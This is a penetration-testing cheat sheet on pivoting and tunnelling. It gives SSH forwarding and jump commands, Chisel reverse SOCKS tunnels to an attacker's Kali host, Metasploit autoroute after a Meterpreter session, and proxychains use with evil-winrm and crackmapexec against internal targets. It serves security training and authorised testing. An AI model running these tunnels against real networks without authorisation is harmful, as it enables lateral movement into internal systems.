# Pivoting & Tunneling

## SSH Local Port Forward (access ONE internal service)

```bash
ssh -L LOCAL_PORT:INTERNAL_TARGET:REMOTE_PORT user@PIVOT
ssh -L 8080:172.16.0.10:80 user@10.10.10.15
# Kali localhost:8080 → 172.16.0.10:80

# Multiple ports
ssh -L 8080:172.16.0.10:80 -L 4445:172.16.0.10:445 user@PIVOT
```

## SSH Dynamic Port Forward (SOCKS proxy — access EVERYTHING)

```bash
ssh -D 9050 -fN user@PIVOT
# Configure /etc/proxychains4.conf: socks5 127.0.0.1 9050

proxychains nmap -sT -Pn INTERNAL_TARGET
proxychains curl http://INTERNAL_TARGET
proxychains evil-winrm -i INTERNAL_TARGET -u user -p pass
proxychains crackmapexec smb INTERNAL_RANGE -u user -p pass
```

## SSH Reverse Port Forward (target can't accept inbound)

```bash
ssh -R 9090:172.16.0.10:80 kali_user@KALI_IP
# Kali localhost:9090 → 172.16.0.10:80 (tunnel initiated FROM target)
```

## SSH Jump (-J)

```bash
ssh -J user@PIVOT user@INTERNAL_TARGET                    # one hop
ssh -J user@HOP1,user@HOP2 user@FINAL_TARGET              # two hops
ssh -D 9050 -J user@PIVOT user@INTERNAL_TARGET             # SOCKS through jump
```

## Background tunnel (no shell)

```bash
ssh -D 9050 -fN user@PIVOT       # -f = background, -N = no command
```

## Chisel (when SSH isn't available)

```bash
# On Kali (server)
chisel server --reverse -p 8000

# On target (client) — SOCKS proxy
./chisel client KALI:8000 R:socks

# On target (client) — port forward
./chisel client KALI:8000 R:8080:172.16.0.10:80
```

## Metasploit Pivoting

```bash
# After getting a Meterpreter session
run autoroute -s 172.16.0.0/24

# SOCKS proxy for external tools
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
# Configure proxychains: socks5 127.0.0.1 1080

# Port forward
meterpreter> portfwd add -l 8080 -p 80 -r 172.16.0.10
```

## Proxychains Rules

```bash
# WORKS through proxychains:
nmap -sT -Pn          # TCP connect scan (no SYN scan!)
curl, wget
evil-winrm, smbclient, crackmapexec
ssh, impacket tools

# DOES NOT WORK through proxychains:
nmap -sS              # SYN scan (raw packets)
nmap -sU              # UDP scan
ping                  # ICMP
```

## Kill Background Tunnels

```bash
pkill -f "ssh -D"
pkill -f "ssh -L"
pkill -f "ssh -fN"
```
